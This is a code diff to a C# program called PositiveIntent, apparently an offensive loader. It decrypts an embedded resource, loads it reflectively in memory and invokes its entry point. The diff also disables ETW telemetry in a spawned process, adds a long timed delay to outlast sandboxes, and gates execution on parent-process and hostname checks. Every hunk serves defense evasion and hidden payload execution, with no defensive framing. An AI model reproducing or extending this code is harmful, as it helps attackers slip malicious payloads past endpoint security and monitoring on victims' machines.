@@ -7,6 +7,9 @@ using System.Threading;
 using System.Management;
 using System.Linq;
 using System.IO;
+using System.Globalization;
+using System.Net.Sockets;
+using System.Net;
 
 namespace PositiveIntent
 {
@@ -37,16 +40,14 @@ namespace PositiveIntent
                 Environment.Exit(-1);
             }
         }
-        static void DelayExecution()
+        static void DelayExecution(long milliseconds)
         {
-            long current_iteration = 0;
-            long target_iterations = 1000000000;
-            while (current_iteration != target_iterations)
+            var stopwatch = Stopwatch.StartNew();
+            while (stopwatch.ElapsedMilliseconds < milliseconds)
             {
-                current_iteration++;
+                // keep looping until the elapsed time reaches the desired delay
             }
         }
-        // TODO: sandbox check via hostname
         static void Fork(string args)
         {
             Process p = new Process();
@@ -56,13 +57,11 @@ namespace PositiveIntent
             p.StartInfo.EnvironmentVariables["COMPlus_ETWEnabled"] = "0";
             p.StartInfo.RedirectStandardOutput = true;
             p.StartInfo.RedirectStandardError = true;
-            //Environment.SetEnvironmentVariable("CO" + "MP" + "lus" + "_ETWE" + "nab" + "led", "0");
             p.Start();
             Console.WriteLine(p.StandardOutput.ReadToEnd());
             Console.WriteLine(p.StandardError.ReadToEnd());
             p.WaitForExit();
         }
-
         static void LoadAssembly(string[] args)
         {
             byte[] eassembly = Properties.Resources.File1;
@@ -76,25 +75,24 @@ namespace PositiveIntent
             Assembly assembly = Assembly.Load(dassembly);
             //Find the Entrypoint or "Main" method
             MethodInfo method = assembly.EntryPoint;
+
             //Get Parameters
-            //object[] parameters = new[] { new string[] { "triage" } };
             object[] parameters = new[] { args };
+
             //Invoke the method with the specified parameters
             object execute = method.Invoke(null, parameters);
         }
-
         public static void Main(string[] args)
         {
             if (GetParentProcess())
             {
-                DelayExecution();
+                DelayExecution(13371337);
                 Bannana.Peel();
                 LoadAssembly(args);
             }
             else if (args.Length != 0)
             {
                 CheckHostname();
-                DelayExecution();
                 Fork(string.Join(" ", args));
             }
         }
